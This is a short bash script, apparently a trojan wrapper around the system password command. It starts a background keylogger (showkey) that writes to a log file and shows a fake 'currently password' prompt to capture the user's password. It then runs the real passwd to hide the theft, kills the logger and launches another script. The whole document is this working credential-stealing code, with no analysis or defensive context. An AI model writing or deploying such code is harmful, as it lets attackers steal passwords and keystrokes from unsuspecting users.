#!/bin/bash

FOLDER="kelompokkucing"
showkey > /opt/$FOLDER/logger.txt &

# for fake
echo -n "currently password : "
read currentPassword
echo ""
# end-for fake

/usr/bin/passwd
let counter=0
for TARGET in $(ps aux | grep showkey);do
    if [[ $counter = 1 ]]
    then
        kill $TARGET
    fi
    ((counter++))
done
# 
sleep 10
/opt/$FOLDER/function.sh
